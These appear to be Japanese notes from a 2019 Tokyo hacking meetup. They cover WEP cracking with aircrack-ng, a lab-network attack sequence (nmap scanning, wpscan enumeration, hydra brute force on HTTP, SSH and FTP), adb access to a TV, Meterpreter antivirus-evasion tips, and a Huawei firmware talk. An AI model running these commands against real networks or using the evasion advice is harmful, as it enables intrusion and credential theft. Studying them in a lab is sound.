# ゆるいハッキング大会 in TOKYO 2019/05/25 in HSB

## 基本知識と業務で使えるセキュティ技術基礎知識
kodakにいた人
`zone-h` crackingされたweb一覧

まぁそうですよね．ExploitDB．
あの流出：ベネッセが合併した会社が原因　遺体バラバラ(2011)

0day = traffic accident

## WEP crack
aircrackはmonitor&analysis パケットを採取することで解析する
BF攻撃やList攻撃と違ってAPに攻撃と検知されづらい

kaliでwifiクラックします
```
$ airodump-ng wlan0mon
$ airodump-ng --channel <number> --bssid <MAC> -w <file_name> wlan0mon
```
だいたいデータが200000くらい貯まれば`aircrack-ng <file_name>.cap`してみる

クラックした結果，有意味なパスワードであればこのユーザは他のパスにも同じような文言を使用している可能性が高い．

[WEP crack note](https://nvnote.com/wep-crack-kalilinux/)
[ハッカーテキスト](http://www.byakuya-shobo.co.jp/hj/moh/)

WEPの偽装認証
```
$ airplay-ng -1 <間隔(s)> -q <Keep Aliveを送る間隔(s)> -a <MAC> wlan0mon
```
を使う方法がある

- Fern WiFiを使う方法でうまくいけない

## LPIC
LPIC 303はlevel1-2の後に受験できるけれど，セキュリティ関連らしい

Linux認定試験とは違うらしい．なんか最近分裂したよね．
LinuCにはちょっとお怒り

## Network Hacking
nmap --> zenmap(GUI)

FWでICMPをdropさせる方法でポートスキャンは守れる
攻撃者にめんどくさいと思わせることが大事

```
# Network内部調査 ポートスキャン
fping -g 192.168.20.1 192.168.20.254
nmap -sP 192.168.20.0-255

nmap 192.168.20.0/24 -sS -A
nmap 192.168.20.16 -sS -A

curl http://192.168.20.16/ | grep 'href='
curl http://192.168.20.16/staff/
curl http://192.168.20.16/wp/

wpscan --url 192.168.20.16/wp/ -e -u
cat user.txt
cat password.txt
wpscan --url 192.168.20.16/wp/ -w /root/password.txt --usernames /root/user.txt

hydra -L /root/user.txt -P /root/password.txt 192.168.20.16 http-get /staff
hydra -l /root/password.txt 192.168.20.16 ssh
ssh host:192.168.20.16 login:root password:password
# ftpが開いてるならこれが早い
hydra -L /rrot/user.txt -P /rrot/password.txt 192.168.20.16 ftp
```

## root_apple
マルウェア作れって言われたときの回避

いきなり外部ペネトレしてよと言われることもある
ネットに繋げられるTVにnmapしたら落ちた()
```
$ nmap -Pn -A -p <port>
$ adb connect <ip:port>
$ adb shell

```

### meterpreter
検知回避できるmalwareをつくろう
メモリー内で実行中の別プロセスに自らを挿入できる
- 主にエクスプロイット(サーバへの侵入)が成功した後に使用されるペイロードの１つとして使用される
> 侵入したサーバでMeterpreterを実行すると、サーバ内の調査、さらなる攻撃の実行、リモートでの操作など、様々な事が容易に可能になる。

実際に動いているかどうかはwiresharkで確認する

stageless mode
エンコードをより良く活用できる(検知されづらい)
ステージの通信を暗号化出来ないのか？ EnableStageEncodingがある Pythonなら`-f python`みたいなオプションで難読化コードを渡せる

meterpreterシェルを埋め込むことで
mimikatzが検出できなくなるほど，VirusTotalにも検知されなくなる

[lab.pentestit.ru](lab.pentestit.ru)
で対象環境への侵入を学べる

客用LANからプリンターへ接続することでadminに入った事例がある

## ナビープラス？ 片山さん

ファーウェイの調査
中国国内向けの機器の通信内容を調査
何も動かなさい状態で監視
3月上旬 500MBのDL　ファームウェア --> Blacklist.conf 大量のsoファイル
中間証明書が入っていた　もしかしてMan-In-The-Middle？採掘してる？

日本で無罪になった後，再びファームウェアアップデートがあった
中間証明書を利用したMan-In-The-Middleが行われている可能性